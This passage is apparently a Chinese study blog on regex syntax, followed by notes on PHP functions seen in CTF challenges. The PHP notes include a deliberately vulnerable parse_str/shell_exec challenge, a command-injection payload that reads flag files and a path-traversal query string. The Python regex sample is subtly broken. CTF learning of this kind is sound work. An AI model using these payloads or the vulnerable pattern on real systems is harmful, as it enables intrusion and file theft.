<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Chapter 1</span><br><span class="line">Chapter 5</span><br><span class="line">Chapter 10</span><br><span class="line">Chapter 99</span><br><span class="line">Chapter 123</span><br></pre></td></tr></table></figure>

<p>那么这段会匹配到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Chapter 1</span><br><span class="line">Chapter 5</span><br><span class="line">Chapter 10</span><br><span class="line">Chapter 99</span><br></pre></td></tr></table></figure>

<p>真正的章节标题不仅出现行的开始处，而且它还是该行中仅有的文本。它既<strong>出现在行首又出现在同一行的结尾</strong>。下面的表达式能。通过创建只匹配一行文本的开始和结尾的正则表达式，就可做到这一点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^Chapter [1-9][0-9]&#123;0,1&#125;$/</span><br></pre></td></tr></table></figure>

<p>如果匹配：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Chapter 1</span><br><span class="line">Chapter 5</span><br><span class="line">Chapter 10</span><br><span class="line">Chapter 99</span><br><span class="line">Chapter 123</span><br><span class="line">Chapter 0</span><br><span class="line">Chapter</span><br><span class="line">Chapter 05</span><br><span class="line">Chapter 1 is referenced in Chapter 3</span><br></pre></td></tr></table></figure>

<p>只会匹配到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Chapter 1</span><br><span class="line">Chapter 5</span><br><span class="line">Chapter 10</span><br><span class="line">Chapter 99</span><br></pre></td></tr></table></figure>

<p>匹配单词边界稍有不同，但向正则表达式添加了很重要的能力。<strong>单词边界是单词和空格之间的位置</strong>。非单词边界是任何其他位置。下面的表达式匹配单词 Chapter 的开头三个字符，因为这三个字符出现在单词边界后面：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/\bCha/</span><br></pre></td></tr></table></figure>

<p>如果你输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Chapter 1</span><br><span class="line">Chaotic</span><br><span class="line">AChapter</span><br><span class="line">Cha</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>匹配的内容</strong>：<ul>
<li><code>Chapter 1</code>（匹配 <code>Cha</code>，出现在单词边界）</li>
<li><code>Chaotic</code>（匹配 <code>Cha</code>，出现在单词边界）</li>
<li><code>Cha</code>（匹配整个单词）</li>
</ul>
</li>
<li><strong>不匹配的内容</strong>：<ul>
<li><code>AChapter</code>（<code>Cha</code> 不在单词边界）</li>
</ul>
</li>
</ul>
<p><strong>\b</strong> 字符的位置是非常重要的。如果它位于要匹配的字符串的开始，它在单词的开始处查找匹配项。如果它位于字符串的结尾，它在单词的结尾处查找匹配项。例如，下面的表达式匹配单词 Chapter 中的字符串 ter，因为它出现在单词边界的前面：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ter\b/</span><br></pre></td></tr></table></figure>

<p>如果你输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">preter</span><br><span class="line">alter</span><br><span class="line">terraform</span><br><span class="line">terrestrial</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>匹配的内容</strong>：<ul>
<li><code>preter</code>（匹配 <code>ter</code>，出现在单词结尾）</li>
<li><code>alter</code>（匹配 <code>ter</code>，出现在单词结尾）</li>
</ul>
</li>
<li><strong>不匹配的内容</strong>：<ul>
<li><code>terraform</code>（<code>ter</code> 不在单词结尾）</li>
<li><code>terrestrial</code>（<code>ter</code> 不在单词结尾）</li>
</ul>
</li>
</ul>
<p>下面的表达式匹配 Chapter 中的字符串 apt，但不匹配 aptitude 中的字符串 apt：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/\Bapt/</span><br></pre></td></tr></table></figure>

<p>如果你输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Chapter</span><br><span class="line">apartment</span><br><span class="line">Apt</span><br><span class="line">aptitude</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>匹配的内容</strong>：<ul>
<li><code>Chapter</code>（匹配<code>apt</code>，因为出现在非单词边界）</li>
</ul>
</li>
<li><strong>不匹配的内容</strong>：<ul>
<li><code>aptitude</code>（不匹配 <code>apt</code>，出现在单词边界）</li>
<li><code>Apt</code>（匹配 <code>Apt</code> 中的 <code>Apt</code>，但 <code>\B</code> 确保 <code>apt</code> 出现在非单词边界，但在这个例子中 <code>Apt</code> 是一个独立的单词，所以不匹配）</li>
</ul>
</li>
</ul>
<p>字符串 apt 出现在单词 Chapter 中的非单词边界处，但出现在单词 aptitude 中的单词边界处。对于 <strong>\B</strong> 非单词边界运算符，不可以匹配单词的开头或结尾，如果是下面的表达式，就不匹配 Chapter 中的 Cha：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\BCha</span><br></pre></td></tr></table></figure>

<p>同上原理，不作演示</p>
<hr>
<h3 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h3><p>用圆括号 <strong>()</strong> 将所有选择项括起来，相邻的选择项之间用 <strong>|</strong> 分隔</p>
<p><strong>()</strong> 表示捕获分组，**()** 会把每个分组里的匹配的值保存起来， 多个匹配值可以通过数字 n 来查看(<strong>n</strong> 是一个数字，表示第 n 个捕获组的内容)</p>
<p>比如你输入:  <strong>&#x2F;([1-9])([a-z]+)&#x2F;g</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123mihoyo114514zzz22</span><br></pre></td></tr></table></figure>

<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w21.png"></p>
<p>可以看到匹配到了两个，这个正则意思是第一位是数字然后后面匹配1或多个小写字母</p>
<p>但用圆括号会有一个副作用，使相关的匹配会被缓存，此时可用 <strong>?:</strong> 放在第一个选项前来消除这种副作用</p>
<p>其中 <strong>?:</strong> 是非捕获元之一，还有两个非捕获元是 <strong>?&#x3D;</strong> 和 <strong>?!<strong>，这两个还有更多的含义，前者为正向预查，在</strong>任何开始匹配圆括号内的正则表达式模式的位置</strong>来匹配搜索字符串，后者为负向预查，在<strong>任何开始不匹配该正则表达式模式的位置</strong>来匹配搜索字符串</p>
<h4 id="exp1-exp2"><a href="#exp1-exp2" class="headerlink" title="exp1(?&#x3D;exp2)"></a><strong>exp1(?&#x3D;exp2)</strong></h4><p>查找exp2前面的exp1</p>
<p>还是沿用刚刚的例子，我们把正则语句改成  <strong>&#x2F;mihoyo(?&#x3D;\d)&#x2F;</strong> 也就是匹配一个数字前面的mihoyo</p>
<p>可以看到：</p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w22.png"></p>
<h4 id="-1"><a href="#-1" class="headerlink" title="(?&lt;&#x3D;exp2)exp1"></a><strong>(?&lt;&#x3D;exp2)exp1</strong></h4><p>查找 exp2 后面的 exp1</p>
<p>跟上面差不多，就是换了位置</p>
<h4 id="exp1-exp2-1"><a href="#exp1-exp2-1" class="headerlink" title="exp1(?!exp2)"></a><strong>exp1(?!exp2)</strong></h4><p>查找后面不是 exp2 的 exp1</p>
<p>我们把正则改成 <strong>&#x2F;mihoyo(?![0-9]+)&#x2F;</strong></p>
<p>沿用刚刚的例子，发现：</p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w23.png"></p>
<p>匹配失败，而当我们在mihoyo后面加个非数字比如 <code>-</code>，那么就匹配得到了：</p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w24.png"></p>
<h4 id="-2"><a href="#-2" class="headerlink" title="(?&lt;!exp2)exp1"></a><strong>(?&lt;!exp2)exp1</strong></h4><p>查找前面不是 exp2 的 exp1</p>
<p>也是和上面一样，但是换了个位置</p>
<hr>
<h3 id="反向引用"><a href="#反向引用" class="headerlink" title="反向引用"></a>反向引用</h3><ul>
<li><strong>定义与语法</strong> ：反向引用使用特殊字符来表示对前面某个分组的引用，通常用<code>\</code>后跟数字来表示。例如，<code>\1</code> 表示对第一个捕获组的反向引用，<code>\2</code>表示对第二个捕获组的反向引用，依此类推</li>
<li><strong>作用与应用场景</strong><ul>
<li><strong>匹配相同内容</strong> ：当需要匹配与前面某个特定模式相同的内容时，反向引用非常有用。例如，在验证某些格式的字符串时，如检查一个字符串是否为形如 <code>abc-abc</code> 这种前后部分相同的格式，可以使用反向引用。正则表达式可以写成 <code>^(\w+)-\1$</code>，其中<code>(\w+)</code>是一个捕获组，匹配前面的单词字符部分，后面的<code>\1</code>则表示匹配与第一个捕获组相同的内容</li>
<li><strong>替换操作</strong> ：在使用正则表达式进行字符串替换时，反向引用可以将捕获到的子表达式重新插入到替换后的字符串中。例如，将字符串中的日期格式从 <code>yyyy-mm-dd</code> 转换为 <code>dd-mm-yyyy</code> ，可以使用正则表达式 <code>(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)</code> 进行匹配和捕获，然后在替换字符串中使用反向引用，如 $3-$2-$1</li>
<li>（在某些语言中，反向引用的表示方式可能不同，例如在 JavaScript 中使用 $1、$2 等，在 Python 中使用 \g&lt;1&gt;、\g&lt;2&gt; 等）</li>
</ul>
</li>
</ul>
<p><strong>E.g1</strong></p>
<p>我现在有一段句子，里面包含多个重复的单词</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello hello world world this is is a test test</span><br></pre></td></tr></table></figure>

<p>我们可以用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(\b\w+\b)\s+\1</span><br></pre></td></tr></table></figure>

<p>来匹配，这里的\b\b就是取边界（边界也是一样的字符，遇到不一样的就不配），然后中间都是相同的字段</p>
<p><code>\s+</code> 负责匹配一个或多个空白符，<code>\1</code>就代表示匹配与第一个捕获组相同的内容，比如在这个例子中，第一个捕获组捕捉到的是 <code>hello</code>，<code>\1 </code>就匹配后面也是<code>hello</code>的字符串，以此类推它可以捕获全部相同的字段</p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w25.png"></p>
<p><strong>E.g2</strong></p>
<p>我们来匹配个URL，比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.example.com:8080/path/to/resource</span><br></pre></td></tr></table></figure>

<p>我们用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/(\w+):\/\/([^\:]+)(:\d*)?([^# ]*)/</span><br></pre></td></tr></table></figure>

<p><strong>1. <code>(\w+)</code></strong></p>
<ul>
<li><strong>含义</strong>: 匹配一个或多个字母、数字或下划线</li>
<li><strong>作用</strong>: 用于匹配 URL 的协议部分，例如 <code>http</code> 或 <code>https</code></li>
</ul>
<p><strong>2. <code>:\/\/</code></strong></p>
<ul>
<li><strong>含义</strong>: 匹配字面的 <code>://</code></li>
<li><strong>作用</strong>: 分隔协议部分和域名部分</li>
</ul>
<p><strong>3. <code>([^/:]+)</code></strong></p>
<ul>
<li><strong>含义</strong>: 匹配一个或多个不是 <code>/</code> 或 <code>:</code> 的字符</li>
<li><strong>作用</strong>: 用于匹配域名部分，例如 <code>www.example.com</code></li>
</ul>
<p><strong>4. <code>(:\d*)?</code></strong></p>
<ul>
<li><strong>含义</strong>:<ul>
<li><code>:</code>: 匹配字面的 <code>:</code></li>
<li><code>\d*</code>: 匹配零个或多个数字</li>
<li><code>?</code>: 表示整个部分是可选的。</li>
</ul>
</li>
<li><strong>作用</strong>: 用于匹配端口号部分，例如 <code>:8080</code>，但这个部分是可选的</li>
</ul>
<p><strong>5. <code>([^# ]*)</code></strong></p>
<ul>
<li><strong>含义</strong>: 匹配零个或多个不是 <code>#</code> 或空格的字符</li>
<li><strong>作用</strong>: 用于匹配 URL 的路径部分，例如 <code>/path/to/resource</code></li>
</ul>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w25.png"></p>
<p>用Python你可以这样：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.example.com:8080/path/to/resource&quot;</span></span><br><span class="line">pattern = <span class="string">r&#x27;/(\w+):\/\/([^\:]+)(:\d*)?([^# ]*)/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> = re.<span class="keyword">match</span>(pattern, url)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Protocol:&quot;</span>, <span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Domain:&quot;</span>, <span class="keyword">match</span>.group(<span class="number">2</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Port:&quot;</span>, <span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Path:&quot;</span>, <span class="keyword">match</span>.group(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No match&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><h3 id="PHP函数"><a href="#PHP函数" class="headerlink" title="PHP函数"></a>PHP函数</h3><p>（列一些我最近遇到的）</p>
<h4 id="1-shell-exec"><a href="#1-shell-exec" class="headerlink" title="1.shell_exec"></a>1.shell_exec</h4><p>执行里面的语句</p>
<h4 id="2-parse-str"><a href="#2-parse-str" class="headerlink" title="2.parse_str()"></a>2.parse_str()</h4><ul>
<li><code>parse_str()</code>函数直接将查询参数解析到当前作用域变量中</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$id</span>); <span class="comment">// 未使用第二个参数导致变量覆盖</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&quot;www.baidu.com&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    @<span class="title function_ invoke__">parse_str</span>(<span class="variable">$id</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span>[<span class="number">0</span>] == <span class="string">&#x27;www.polarctf.com&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> .= <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ping -c 2 &#x27;</span> . <span class="variable">$a</span>[<span class="number">0</span>] . <span class="variable">$ip</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$result&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;其实很简单！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>id=a[]=www.polarctf.com&amp;cmd=;tac f*</code></p>
<h4 id="3-is-numeric"><a href="#3-is-numeric" class="headerlink" title="3.is_numeric"></a>3.is_numeric</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">is_numeric</span> ( <span class="keyword">mixed</span> <span class="variable">$var</span> )</span><br></pre></td></tr></table></figure>

<p>如果变量是数值或数值字符串，则返回 <code>true</code>，否则返回 <code>false</code></p>
<h4 id="4-strrev"><a href="#4-strrev" class="headerlink" title="4.strrev"></a>4.strrev</h4><p><code>strrev</code> 是 PHP 中用于反转字符串的函数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strrev</span>(<span class="string">&quot;Hello World!&quot;</span>); <span class="comment">// 输出 &quot;!dlroW olleH&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="5-mb-strpos"><a href="#5-mb-strpos" class="headerlink" title="5.mb_strpos"></a>5.mb_strpos</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span> ( <span class="keyword">string</span> <span class="variable">$haystack</span> , <span class="keyword">string</span> <span class="variable">$needle</span> [, <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span> [, <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">mb_internal_encoding</span>() ]] )</span><br></pre></td></tr></table></figure>

<ol>
<li><strong><code>$haystack</code></strong>:<ul>
<li>必需。要在其中搜索的字符串（主字符串）。</li>
</ul>
</li>
<li><strong><code>$needle</code></strong>:<ul>
<li>必需。要查找的字符或子字符串。</li>
</ul>
</li>
<li><strong><code>$offset</code></strong>:<ul>
<li>可选。指定从哪个位置开始搜索。默认值为 <code>0</code>（从字符串开头开始搜索）。</li>
</ul>
</li>
<li><strong><code>$encoding</code></strong>:<ul>
<li>可选。指定字符编码。如果未指定，默认使用 <code>mb_internal_encoding()</code> 函数返回的内部编码。</li>
</ul>
</li>
</ol>
<ul>
<li>返回 <code>$needle</code> 在 <code>$haystack</code> 中首次出现的位置（从 0 开始计数）。</li>
<li>如果未找到 <code>$needle</code>，返回 <code>false</code>。</li>
</ul>
<p><strong>示例代码</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查找单个字符的位置</span></span><br><span class="line"><span class="variable">$pos</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$string</span>, <span class="string">&quot;世&quot;</span>, <span class="number">0</span>, <span class="variable">$encoding</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;字符 &#x27;世&#x27; 的位置: &quot;</span> . <span class="variable">$pos</span>; <span class="comment">// 输出：字符 &#x27;世&#x27; 的位置: 7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找子字符串的位置</span></span><br><span class="line"><span class="variable">$pos</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$string</span>, <span class="string">&quot;世界&quot;</span>, <span class="number">0</span>, <span class="variable">$encoding</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;子字符串 &#x27;世界&#x27; 的位置: &quot;</span> . <span class="variable">$pos</span>; <span class="comment">// 输出：子字符串 &#x27;世界&#x27; 的位置: 7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>):</span><br><span class="line">mb_strpos 是一个多字节字符串处理函数，用于查找指定字符的位置。</span><br><span class="line"><span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span> 是为了确保即使 <span class="variable">$page</span> 中没有问号 ?，也不会导致 mb_strpos 返回 <span class="literal">false</span>。</span><br><span class="line"><span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>) 的作用是找到 <span class="variable">$page</span> 中第一个问号 ? 的位置。</span><br><span class="line">如果 <span class="variable">$page</span> 中已经包含问号 ?，则返回问号的位置；如果 <span class="variable">$page</span> 中没有问号，则 <span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span> 会在末尾添加一个问号，返回问号的位置即字符串长度。</span><br></pre></td></tr></table></figure>

<p><code>?file=source.php%3f../../../../../ffffllllaaaagggg</code></p>
<h4 id="6-mb-substr"><a href="#6-mb-substr" class="headerlink" title="6.mb_substr"></a>6.mb_substr</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_substr</span> ( <span class="keyword">string</span> <span class="variable">$string</span> , <span class="keyword">int</span> <span class="variable">$start</span> [, <span class="keyword">int</span> <span class="variable">$length</span> = <span class="literal">NULL</span> [, <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">mb_internal_encoding</span>() ]] )</span><br></pre></td></tr></table></figure>

<ol>
<li><strong><code>$string</code></strong>:<ul>
<li>必需。原始字符串。</li>
</ul>
</li>
<li><strong><code>$start</code></strong>:<ul>
<li>必需。指定从哪个位置开始截取。如果为正数，从字符串开头向后数 <code>$start</code> 个字符的位置开始；如果为负数，从字符串末尾向前数 <code>$start</code> 个字符的位置开始。</li>
</ul>
</li>
<li><strong><code>$length</code></strong>:<ul>
<li>可选。指定截取的长度。如果为正数，从 <code>$start</code> 位置开始向前数 <code>$length</code> 个字符；如果为负数，从 <code>$start</code> 位置开始到字符串末尾向前数 <code>$length</code> 个字符的位置；如果省略，则截取从 <code>$start</code> 到字符串末尾的所有字符。</li>
</ul>
</li>
<li><strong><code>$encoding</code></strong>:<ul>
<li>可选。指定字符编码。如果未指定，默认使用 <code>mb_internal_encoding()</code> 函数返回的内部编码。</li>
</ul>
</li>
</ol>
<ul>
<li>返回从 <code>$start</code> 开始，长度为 <code>$length</code> 的子字符串。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从第7个字符开始截取，长度为2</span></span><br><span class="line"><span class="variable">$sub</span> = <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$string</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="variable">$encoding</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sub</span>; <span class="comment">// 输出：世界</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从第7个字符开始截取到末尾</span></span><br><span class="line"><span class="variable">$sub</span> = <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$string</span>, <span class="number">7</span>, <span class="literal">NULL</span>, <span class="variable">$encoding</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sub</span>; <span class="comment">// 输出：世界!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从倒数第5个字符开始截取，长度为5</span></span><br><span class="line"><span class="variable">$sub</span> = <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$string</span>, -<span class="number">5</span>, <span class="number">5</span>, <span class="variable">$encoding</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sub</span>; <span class="comment">// 输出：, 世界!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从倒数第5个字符开始截取到倒数第2个字符</span></span><br><span class="line"><span class="variable">$sub</span> = <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$string</span>, -<span class="number">5</span>, -<span class="number">2</span>, <span class="variable">$encoding</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sub</span>; <span class="comment">// 输出：, 世</span></span><br></pre></td></tr></table></figure>



<h4 id="7-putenv"><a href="#7-putenv" class="headerlink" title="7.putenv"></a>7.putenv</h4><ol>
<li><strong><code>putenv</code> 函数</strong>:<ul>
<li><code>putenv</code> 是 PHP 中的一个函数，用于设置环境变量。</li>
<li>语法：<code>bool putenv ( string $setting )</code></li>
<li>参数 <code>$setting</code> 是一个字符串，格式为 <code>&quot;变量名=值&quot;</code>。</li>
</ul>
</li>
<li><strong><code>PATH=/home/rceservice/jail</code></strong>:<ul>
<li>这是设置 <code>PATH</code> 环境变量的值为 <code>/home/rceservice/jail</code>。</li>
<li><code>PATH</code> 环境变量用于指定系统在查找可执行文件时搜索的目录路径。</li>
</ul>
</li>
</ol>
<p>假设有一个 PHP 脚本需要执行外部命令 <code>ls</code>，并且 <code>PATH</code> 被设置为 <code>/home/rceservice/jail</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>系统会在 <code>/home/rceservice/jail</code> 目录下查找 <code>ls</code> 命令。</li>
<li>如果 <code>/home/rceservice/jail/ls</code> 存在，就会执行该文件；否则，会报错。</li>
</ul>
<h4 id="8-pahinfo"><a href="#8-pahinfo" class="headerlink" title="8.pahinfo()"></a>8.pahinfo()</h4><p>将传入的路径“字典化”</p>
<p><strong>var_dump(pathinfo(‘sandox&#x2F;cfbb870b58817bf7705c0bd826e8dba7&#x2F;123’));</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">array(3) &#123;</span><br><span class="line">  [&quot;dirname&quot;]=&gt;</span><br><span class="line">  string(39) &quot;sandox/cfbb870b58817bf7705c0bd826e8dba7&quot;</span><br><span class="line">  [&quot;basename&quot;]=&gt;</span><br><span class="line">  string(3) &quot;123&quot;</span><br><span class="line">  [&quot;filename&quot;]=&gt;</span><br><span class="line">  string(3) &quot;123&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

